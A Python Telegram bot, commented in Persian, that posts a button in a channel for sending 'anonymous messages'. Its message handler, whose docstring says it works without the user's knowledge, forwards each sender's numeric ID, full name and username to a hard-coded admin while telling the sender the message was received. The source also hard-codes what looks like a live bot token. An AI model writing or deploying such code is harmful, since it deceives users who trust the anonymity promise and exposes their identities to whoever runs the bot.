from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# توکن ربات
TOKEN = "7669113616:AAH6qqabVjqVu4X44GFrs68AjN3CaEFPoMg"
# شناسه کانال (مثلاً @im_sadegh)
CHANNEL_ID = "@im_sadegh"
# آیدی عددی خودت برای دریافت پیام‌ها
ADMIN_CHAT_ID = 5280481527
x = "a"


async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    ارسال پیام به کانال با دکمه شیشه‌ای که به ربات هدایت می‌کند
    """
    bot_info = await context.bot.get_me()
    bot_username = bot_info.username

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("ارسال پیام ناشناس",
                              url=f"https://t.me/{bot_username}")]
    ])

    await context.bot.send_message(
        chat_id=CHANNEL_ID,
        text="برای ارسال پیام ناشناس روی دکمه زیر کلیک کنید:",
        reply_markup=keyboard
    )
    await update.message.reply_text("✅ پیام در کانال ارسال شد.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    دریافت پیام خصوصی و ارسال آن فقط به ادمین بدون اطلاع کاربر
    """
    if update.message.chat.type == "private":
        user_text = update.message.text
        user_id = update.message.from_user.id
        full_name = update.message.from_user.full_name
        username = update.message.from_user.username or "ندارد"

        hidden_report = (
            f"📥 پیام ناشناس جدید:\n"
            f"🆔 آیدی عددی: {user_id}\n"
            f"👤 نام کامل: {full_name}\n"
            f"🔗 نام کاربری: @{username}\n"
            f"📨 متن پیام:\n{user_text}"
        )

        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=hidden_report)

        await update.message.reply_text("✅ پیام شما دریافت شد و بررسی خواهد شد.")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("سلام! این ربات برای دریافت پیام ناشناس به مدیر ساخته شده است.")


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("setup", setup))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()


if __name__ == "__main__":
    main()
